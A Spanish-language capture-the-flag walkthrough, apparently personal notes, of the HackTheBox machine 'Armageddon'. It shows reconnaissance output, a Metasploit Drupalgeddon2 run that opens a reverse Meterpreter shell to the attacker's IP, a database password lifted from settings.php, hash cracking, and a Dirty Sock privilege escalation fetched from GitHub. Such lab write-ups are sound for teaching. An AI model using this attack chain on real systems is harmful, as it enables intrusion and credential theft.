Haremos los reconocimientos con nmap de siempre, y vemos que solo tiene abierto el puerto 22 y el 80:
```bash
    PORT STATE SERVICE REASON RETIRED VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
|   | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xDFP3J4cpINVArODybhv+uQNECQHDkzTeWL+4aLgKcJiIoA8DqdVvP2UALUJ0XtbyuabPEBZJl3IHG3vztFZ8UEcS94KuW
|   P09ghv6fhc7JbFYONVjTYLiEPD8nrs/V2EPEQj2ubnXzar76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNM1CBPcXn1Nv03SKwokC
|   m4GoMKHSM9rNb9FJGLIY0nq+8mt7RTJZ+WLDHsje3AkBk1yooGFF+0TdOj42YK20tAKDQBWmB1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
|   | ecdsa-sha2-nistp256 AAAAE2VjZHNoYTE5<...>7js497Vr7EGlgsjUtbIgUrY=
|   256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9Zlc3EA13xZbzvvdjZRWhnu9clF0Ue7irG8kT0oR4A
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-title: Welcome to Armageddon | Armageddon
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```
```bash
(root@kali)-[/home/mario/Escritorio/armageddon]
# whatweb 10.10.10.233
http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Armageddon], Script[text/javascript], Title[Welcome to Armageddon | Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```[cite: 2]
```
Y esta es la web:
![[Pasted image 20221218150613.png]]
Tenemos la oportunidad de crear una cuenta así que la vamos a crear, pero vemos que tiene que se aprobada por el administrador:
![[Pasted image 20221218150623.png]]
![[Pasted image 20221218150626.png]]
Si hacemos fuzzing, encontramos algunos directorios y vemos uno que se llama scripts, el cual puede ser muy interesante:

```bash 
ID      Response   Lines       Word        Chars       Payload
000000001:   200        156 L       407 W       7440 Ch     "# directory-list-2.3-medium.txt"
000000274:   301        7 L         20 W        236 Ch      "scripts"
000000014:   200        156 L       407 W       7440 Ch     "http://10.10.10.233/"
000000013:   200        156 L       407 W       7440 Ch     "#"
000000011:   200        156 L       407 W       7440 Ch     "# Priority ordered case sensative list, where entries were found"
000000012:   200        156 L       407 W       7440 Ch     "# on atleast 2 different hosts"
000000009:   200        156 L       407 W       7440 Ch     "# Suite 300, San Francisco, California, 94105, USA."
000000010:   200        156 L       407 W       7440 Ch     "#"
000000534:   301        7 L         20 W        234 Ch      "sites"
000000006:   200        156 L       407 W       7440 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"
000000008:   200        156 L       407 W       7440 Ch     "# or send a letter to Creative Commons, 171 Second Street,"
000000005:   200        156 L       407 W       7440 Ch     "# This work is licensed under the Creative Commons"
000000002:   200        156 L       407 W       7440 Ch     "#"
000000004:   200        156 L       407 W       7440 Ch     "#"
000000638:   301        7 L         20 W        237 Ch      "includes"
000000787:   301        7 L         20 W        237 Ch      "profiles"
000000101:   301        7 L         20 W        233 Ch      "misc"
000000127:   301        7 L         20 W        235 Ch      "themes"
000000145:   301        7 L         20 W        236 Ch      "modules"
000000007:   200        156 L       407 W       7440 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000000003:   200        156 L       407 W       7440 Ch     "# Copyright 2007 James Fisher"
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests ...
```[cite: 3]
```
Y en esta ruta tenemos una serie de scripts:
![[Pasted image 20221218150648.png]]
Una vez llegados a este punto, debemos mirar la versión de drupal para ver si existen vulnerabilidades; y podemos ver en el código fuente que estamos ante la versión 7:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN"
"http://www.w3.org/MarkUp/DTD/xhtml-rdfa-1.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" version="XHTML+RDFa 1.0" dir="ltr"
xmlns:content="http://purl.org/rss/1.0/modules/content/"
xmlns:dc="http://purl.org/dc/terms/"
xmlns:foaf="http://xmlns.com/foaf/0.1/"
xmlns:og="http://ogp.me/ns#"
xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
xmlns:sioc="http://rdfs.org/sioc/ns#"
xmlns:sioct="http://rdfs.org/sioc/types#"
xmlns:skos="http://www.w3.org/2004/02/skos/core#"
xmlns:xsd="http://www.w3.org/2001/XMLSchema">

<head profile="http://www.w3.org/1999/xhtml/vocab">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="http://10.10.10.233/misc/favicon.ico" type="image/vnd.microsoft.icon" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
<title>Welcome to Armageddon | Armageddon</title>
<style type="text/css" media="all">
@import url("http://10.10.10.233/modules/system/system.base.css?qkrkcw");
@import url("http://10.10.10.233/modules/system/system.menus.css?qkrkcw");
@import url("http://10.10.10.233/modules/system/system.messages.css?qkrkcw");
@import url("http://10.10.10.233/modules/system/system.theme.css?qkrkcw");
</style>
<style type="text/css" media="all">
@import url("http://10.10.10.233/modules/comment/comment.css?qkrkcw");
@import url("http://10.10.10.233/modules/field/theme/field.css?qkrkcw");
@import url("http://10.10.10.233/modules/node/node.css?qkrkcw");
@import url("http://10.10.10.233/modules/search/search.css?qkrkcw");
@import url("http://10.10.10.233/modules/user/user.css?qkrkcw");
</style>
<style type="text/css" media="all">
@import url("http://10.10.10.233/themes/bartik/css/layout.css?qkrkcw");
@import url("http://10.10.10.233/themes/bartik/css/style.css?qkrkcw");

```
Si buscamos por searchsploit drupal 7 vemos que existen muchos exploits y se nos menciona algo que cie drupalgeddon y que podemos explotarlo con metasploit [[Hacking Drupal]]:
```bash 
Drupal < 4.7.6 - Post Comments Remote Command Execution
Drupal < 5.1 - Post Comments Remote Command Execution
Drupal < 5.22/6.16 - Multiple Vulnerabilities
Drupal < 7.34 - Denial of Service
Drupal < 7.34 - Denial of Service
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploi
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution
Drupal < 8.6.9 - REST Module Remote Code Execution
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)
Drupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Injections
Drupal Module CAPTCHA - Security Bypass
Drupal Module CKEditor 3.0 < 3.6.2 - Persistent EventHandler Cross-Site Scripting
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution
```

Lo buscamos en metasploit:
```bash
msf6 >search drupalgeddon

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28      excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2
```
Establecemos la configuración de LHOST, RHOST y LPORT:
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.22
LHOST => 10.10.14.22
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LPORT 443
LPORT => 443

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233

```
Lanzamos el ataque con metasploit y ya estamos dentro:
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.22:443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.22:443 -> 10.10.10.233:54520) at 2022-11-25 12:48:09 +0100

meterpreter > 
```
Cuando entramos con metasploit tenemos un meterpreter, pero si queremos una shell normal debemos escribir el comando shell y ya tenemos una shell normal como si la intrusión hubiera sido con netcat:

Ahora debemos buscar si existen credenciales de bases de datos dentro de los archivos de configuración de drupal, lo cual se encuentra en la ruta /var/www/html/sites/default/settings.php:
```php
* @endcode
*/
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
Por tanto ahora que tenemos unas credenciales de bases de datos mysql, vamos a loguearnos dentro de esta base de datos, ejecutando el comando show databases:
Listamos las tablas:
Y listamos los registros de las columnas name, pass de la tabla users:
![[Pasted image 20221218150809.png]]
Esta contraseña viene hasheada, pero podemos hacerle un ataque de fuerza bruta con john the ripper; y vemos que nos la encuentra:[[John The Ripper]]
Ahora que tenemos un usuario y la contraseña, probamos a ver si podemos acceder por ssh utilizando estas credenciales; y vemos que sí:
Aquí ya tenemos la flag de user; y si hacemos un sudo -l vemos que este usuario puede instalar cualquier paquete snap:
Cuando veamos que podemos ejecutar cualquier comando por snap, significa que podemos elevar nuestros privilegios con una vulnerabilidad conocida como Dirty Sock. Si miramos por internet, encontramos un exploit de github en este link que nos permite elevar nuestros privilegios con solo ejecutarlo:
https://github.com/f4T1H21/dirty_sock
![[Pasted image 20230209110046.png]]
Nos lo descargamos en nuestra máquina host:
Lo compartimos montando un servidor http con python a la máquina víctima:
![[Pasted image 20230209110202.png]]
Y desde la máquina víctima lo descargamos:
![[Pasted image 20230209110234.png]]
Lo ejecutamos:
Y nos convertimos en el usuario root:
![[Pasted image 20230209110337.png]]
